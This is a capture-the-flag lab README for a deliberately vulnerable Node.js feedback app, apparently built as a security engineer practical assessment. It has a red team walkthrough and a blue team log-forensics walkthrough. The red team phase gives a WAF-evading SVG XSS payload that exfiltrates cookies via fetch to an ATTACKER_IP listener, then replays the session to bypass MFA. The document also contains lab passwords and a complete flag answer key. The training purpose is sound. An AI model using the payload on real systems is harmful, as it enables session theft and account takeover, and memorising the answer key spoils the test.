# CTF Lab: Red vs. Blue — Cookies Reuse & MFA Bypass

> **Scenario:** Internal security audits have identified a critical flaw in a corporate "Admin Feedback System."  
> While MFA is enforced, the session token issuance logic is flawed — enabling XSS-to-session-replay attacks.

---

## 📁 Repository Structure

```
.
├── Dockerfile
├── docker-compose.yml
├── app/
│   ├── index.js          # Vulnerable Node.js web application
│   └── package.json
├── scripts/
│   ├── entrypoint.sh     # Container startup script
│   ├── inject-logs.sh    # Simulated attack log seeder
│   └── setup.sh          # Proxmox VM provisioning script
└── README.md
```

---

## 🚀 Deployment Instructions (Proxmox Environment)

### Prerequisites
- Proxmox VE with an Ubuntu 22.04 VM
- VM has internet access (to pull Docker base images)
- Minimum specs: 1 vCPU, 1 GB RAM, 10 GB disk

### Step 1 — Clone the repository inside the VM

```bash
git clone https://github.com/<your-username>/ctf-lab-mfa-bypass.git
cd ctf-lab-mfa-bypass
```

### Step 2 — Run the automated setup script

```bash
chmod +x scripts/setup.sh
sudo bash scripts/setup.sh
```

This script will:
- Install Docker and Docker Compose
- Add `feedback.admin.local` to `/etc/hosts`
- Open firewall ports `3075` and `2275`
- Build the Docker image and start the container
- Inject the simulated attack log sequence

### Step 3 — Verify deployment

```bash
# Check container is running
docker ps

# Check web app
curl -I http://feedback.admin.local:3075

# Check SSH
ssh analyst@feedback.admin.local -p 2275
# Password: blue_team_rocks

# Check logs were injected
docker exec admin-feedback-system wc -l /opt/admin/logs/access.log
```

### Manual Deployment (alternative)

```bash
docker compose up -d --build
```

---

## 🔴 Red Team Walkthrough

### Phase 1: Reconnaissance

**Goal:** Identify the target stack, hidden endpoints, and session behaviour.

#### Step 1.1 — Identify backend technology
```bash
curl -I http://feedback.admin.local:3075/
# Look for:  X-Powered-By: Node.js
# Flag: SCENARIO75{Node.js}
```

#### Step 1.2 — Enumerate hidden paths via robots.txt
```bash
curl http://feedback.admin.local:3075/robots.txt
# Output:
#   User-agent: *
#   Disallow: /api/verify-mfa    ← Flag: SCENARIO75{/api/verify-mfa}
#   Disallow: /dashboard          ← Flag: SCENARIO75{/dashboard}
```

#### Step 1.3 — View HTML source for ASCII art clue
```bash
curl -s http://feedback.admin.local:3075/ | grep -A5 'HINT'
# Flag embedded in comment: SCENARIO75{robots.txt}
```

#### Step 1.4 — Observe the pre-authentication cookie
```bash
curl -c cookies.txt http://feedback.admin.local:3075/
cat cookies.txt
# pre_mfa_session=pending_mfa_verification   (HttpOnly=false)
# Flags: SCENARIO75{pre_mfa_session}  SCENARIO75{pending_mfa_verification}
#        SCENARIO75{False}
```

---

### Phase 2: Defense Evasion (WAF Bypass & XSS)

**Goal:** Exploit the feedback form to steal the admin session cookie.

#### Step 2.1 — Probe the feedback endpoint
Navigate to: `http://feedback.admin.local:3075/feedback`  
Login with `admin / admin`, then access the feedback form.

The form submits via `POST /api/feedback`.  
Flag: `SCENARIO75{POST}`

#### Step 2.2 — Trigger the WAF
```
Payload: <script>alert(1)</script>
Response: 403 Forbidden
Flag: SCENARIO75{403}
```

#### Step 2.3 — Bypass WAF using SVG element
```html
<svg onload="alert(1)">
```
This passes the WAF (only `<script>` is blocked).  
Flag: `SCENARIO75{<svg>}`

#### Step 2.4 — Bypass cookie keyword filter
The WAF blocks `document.cookie` — use bracket notation obfuscation:
```javascript
window['docu'+'ment']['coo'+'kie']
```
Flag: `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`

#### Step 2.5 — Craft the full XSS + exfiltration payload
Submit this as feedback (replace `ATTACKER_IP` with your listener IP/port):
```html
<svg onload="fetch('http://ATTACKER_IP:8888/?c='+window['docu'+'ment']['coo'+'kie'])">
```

Start your listener:
```bash
nc -lvnp 8888
```

Flag: `SCENARIO75{fetch}`  
(The `fetch` API is not blocked, allowing cookie exfiltration.)

The stolen cookie will arrive as:
```
session=adm_sess_4dm1n_s3cr3t_t0k3n_2024; pre_mfa_session=pending_mfa_verification
```

---

### Phase 3: Initial Access — Session Replay & MFA Bypass

**Goal:** Replay the stolen admin cookie to access `/dashboard` without MFA.

#### Step 3.1 — Replay the stolen session
```bash
curl -s http://feedback.admin.local:3075/dashboard \
  -H "Cookie: session=adm_sess_4dm1n_s3cr3t_t0k3n_2024"
```

The backend checks `session.startsWith('adm_sess')` → grants access, skipping `/api/verify-mfa` entirely.

Flags:
- `SCENARIO75{/api/verify-mfa}` (endpoint skipped)
- `SCENARIO75{adm_sess}` (session prefix)

#### Step 3.2 — Confirm XSS payload reflection
The dashboard reflects `last_feedback` cookie content inside:
```html
<div class="xss-payload">...your XSS payload...</div>
```
Flag: `SCENARIO75{xss-payload}`

#### Step 3.3 — Capture the final flag
Visible in the dashboard:
```
SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

---

## 🔵 Blue Team Walkthrough

**Access:** SSH into the lab VM
```bash
ssh analyst@feedback.admin.local -p 2275
# Password: blue_team_rocks
```

Logs are located at:
```
/opt/admin/logs/access.log   ← Nginx-style HTTP access log
/opt/admin/logs/error.log    ← Application error & security events
```
Flag: `SCENARIO75{/opt/admin/logs}`

---

### Phase 1: Log Forensics

#### Step 1.1 — Identify the attacker
```bash
grep -v "192.168.1.100" /opt/admin/logs/access.log | grep -v "^$" | awk '{print $1}' | sort | uniq -c
# Suspicious IP: 10.10.14.50
# Flag: SCENARIO75{10.10.14.50}
```

#### Step 1.2 — Confirm User-Agent
```bash
grep "10.10.14.50" /opt/admin/logs/access.log | head -1 | grep -oP '"Mozilla[^"]+'
# Flag: SCENARIO75{Mozilla/5.0}
```

#### Step 1.3 — Find the successful dashboard access
```bash
grep "10.10.14.50" /opt/admin/logs/access.log | grep "/dashboard" | grep " 200 "
# Timestamp: 18:51:55  Status: 200
# Flags: SCENARIO75{200}  SCENARIO75{18:51:55}
```

#### Step 1.4 — Extract the exfiltration string
```bash
grep "10.10.14.50" /opt/admin/logs/access.log | grep "X-Forwarded-For:" | grep -v "\-$"
# X-Forwarded-For: UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0
# Flag: SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}
```

---

### Phase 2: Threat Hunting

#### Step 2.1 — Confirm baseline traffic
```bash
grep "192.168.1.100" /opt/admin/logs/access.log
# Flag: SCENARIO75{192.168.1.100}
```

#### Step 2.2 — Map attacker subnet
```
10.10.14.50 → subnet 10.10.14.0/24
Flag: SCENARIO75{10.10.14.0/24}
```

#### Step 2.3 — Find the first WAF block
```bash
grep "WAF BLOCK" /opt/admin/logs/error.log | head -1
# [2024-06-15 18:50:15] [WARN] WAF BLOCK ... "<script>" ...
# Flags: SCENARIO75{/opt/admin/logs/error.log}  SCENARIO75{<script>}  SCENARIO75{18:50:15}
```

#### Step 2.4 — Verify attacker never reached MFA endpoint
```bash
grep "10.10.14.50" /opt/admin/logs/access.log | grep "/api/verify-mfa"
# (no results — attacker skipped MFA entirely)
# Flag: SCENARIO75{No}
```

---

### Phase 3: Incident Response

#### Step 3.1 — Decode the exfiltration string
```bash
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
# Output: PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}
# Encoding: Base64     Flag: SCENARIO75{Base64}
```

Check string length:
```bash
echo -n "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | wc -c
# Output: 44
# Flag: SCENARIO75{44}
```

#### Step 3.2 — Find CRITICAL severity events
```bash
grep "CRITICAL" /opt/admin/logs/error.log
# Cookie reuse and auth bypass events
# Flag: SCENARIO75{CRITICAL}
```

#### Step 3.3 — Find anomaly at 18:53:10
```bash
grep "18:53:10" /opt/admin/logs/error.log
# [2024-06-15 18:53:10] [CRITICAL] Authentication bypass anomaly — ...
# Flag: SCENARIO75{18:53:10}  SCENARIO75{Authentication bypass anomaly}
```

#### Step 3.4 — Capture the final Blue Team flag
Decode the Base64 string from Phase 1:
```
SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
```

---

## 📋 Complete CTF Flag Reference

| Phase | Context | Flag |
|---|---|---|
| Red Ph1 | X-Powered-By header | `SCENARIO75{Node.js}` |
| Red Ph1 | Disallowed robots path | `SCENARIO75{/api/verify-mfa}` |
| Red Ph1 | Admin area location | `SCENARIO75{/dashboard}` |
| Red Ph1 | ASCII art HTML comment | `SCENARIO75{robots.txt}` |
| Red Ph1 | Pre-auth cookie name | `SCENARIO75{pre_mfa_session}` |
| Red Ph1 | Pre-auth cookie value | `SCENARIO75{pending_mfa_verification}` |
| Red Ph2 | Feedback HTTP method | `SCENARIO75{POST}` |
| Red Ph2 | WAF block status code | `SCENARIO75{403}` |
| Red Ph2 | WAF bypass element | `SCENARIO75{<svg>}` |
| Red Ph2 | Obfuscated cookie access | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` |
| Red Ph2 | HttpOnly setting | `SCENARIO75{False}` |
| Red Ph2 | Exfiltration API | `SCENARIO75{fetch}` |
| Red Ph3 | MFA endpoint skipped | `SCENARIO75{/api/verify-mfa}` |
| Red Ph3 | Admin session prefix | `SCENARIO75{adm_sess}` |
| Red Ph3 | XSS container class | `SCENARIO75{xss-payload}` |
| Red Ph3 | **FINAL RED FLAG** | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` |
| Blue Ph1 | Log directory | `SCENARIO75{/opt/admin/logs}` |
| Blue Ph1 | Attacker IP | `SCENARIO75{10.10.14.50}` |
| Blue Ph1 | Attacker User-Agent | `SCENARIO75{Mozilla/5.0}` |
| Blue Ph1 | Dashboard status code | `SCENARIO75{200}` |
| Blue Ph1 | Dashboard access time | `SCENARIO75{18:51:55}` |
| Blue Ph1 | Exfil Base64 string | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}` |
| Blue Ph2 | Baseline traffic source | `SCENARIO75{192.168.1.100}` |
| Blue Ph2 | Attacker subnet | `SCENARIO75{10.10.14.0/24}` |
| Blue Ph2 | Error log path | `SCENARIO75{/opt/admin/logs/error.log}` |
| Blue Ph2 | First WAF block tag | `SCENARIO75{<script>}` |
| Blue Ph2 | First WAF block time | `SCENARIO75{18:50:15}` |
| Blue Ph2 | Attacker reached MFA? | `SCENARIO75{No}` |
| Blue Ph3 | Encoding type | `SCENARIO75{Base64}` |
| Blue Ph3 | B64 string length | `SCENARIO75{44}` |
| Blue Ph3 | Log severity level | `SCENARIO75{CRITICAL}` |
| Blue Ph3 | Anomaly timestamp | `SCENARIO75{18:53:10}` |
| Blue Ph3 | Exact warning string | `SCENARIO75{Authentication bypass anomaly}` |
| Blue Ph3 | **FINAL BLUE FLAG** | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` |

---

## 🏗️ Architecture Overview

```
┌─────────────────────────────────────────────────────┐
│  Proxmox VM — feedback.admin.local                  │
│  ┌─────────────────────────────────────────────┐    │
│  │  Docker Container: admin-feedback-system    │    │
│  │                                             │    │
│  │  ┌────────────────────┐  Port 3075          │    │
│  │  │  Node.js (Express) │◄──────── HTTP       │    │
│  │  │  Vulnerable App    │                     │    │
│  │  └────────────────────┘                     │    │
│  │                                             │    │
│  │  ┌────────────────────┐  Port 2275          │    │
│  │  │  OpenSSH           │◄──────── SSH        │    │
│  │  │  analyst / ***     │                     │    │
│  │  └────────────────────┘                     │    │
│  │                                             │    │
│  │  /opt/admin/logs/                           │    │
│  │  ├── access.log  (Nginx-style)              │    │
│  │  └── error.log   (App security events)      │    │
│  └─────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────┘
```

---

*Lab built for PT Nauli Mula Data — Security Engineer Practical Assessment*
